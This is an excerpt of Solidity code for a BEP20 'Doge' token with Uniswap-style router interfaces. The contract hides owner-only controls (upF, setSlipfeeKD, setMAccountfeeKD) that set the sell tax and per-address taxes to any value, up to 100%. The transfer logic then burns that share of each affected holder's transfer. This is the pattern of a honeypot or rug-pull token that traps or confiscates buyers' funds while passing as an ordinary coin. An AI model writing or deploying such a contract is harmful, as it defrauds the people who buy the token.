...
interface IUniswapV2Factory {
    ...
    function feeKDTo() external view returns (address);
    function feeKDToSetter() external view returns (address);
    ...
    function setfeeKDTo(address) external;
    function setfeeKDToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeKDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeKDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeKDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeKDOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeKDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Doge is BEP20, Ownable {
    ...
    uint256 private _defaultSellfeeKD = 0;

    uint256 private _defaultBuyfeeKD = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeKD;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeKD = _value;
    }

    function setSlipfeeKD(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeKD[_address] = _value;
    }

    function getSlipfeeKD(address _address) external view onlyownar returns (uint256) {
        return _slipfeeKD[_address];
    }


    function setMAccountfeeKD(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeKD(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeKDAmount = 0;

        if (rF) {
            uint256 tradefeeKD = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeKD = _defaultSellfeeKD;
                }
                if (from == uniswapV2Pair) {

                    tradefeeKD = _defaultBuyfeeKD;
                }
            }
            if (_slipfeeKD[from] > 0) {
                tradefeeKD = _slipfeeKD[from];
            }

            tradefeeKDAmount = _Amount.mul(tradefeeKD).div(100);
        }


        if (tradefeeKDAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeKDAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeKDAmount);
            emit Transfer(from, _deadAddress, tradefeeKDAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeKDAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeKDAmount);
        emit Transfer(from, _to, _Amount - tradefeeKDAmount);
    }
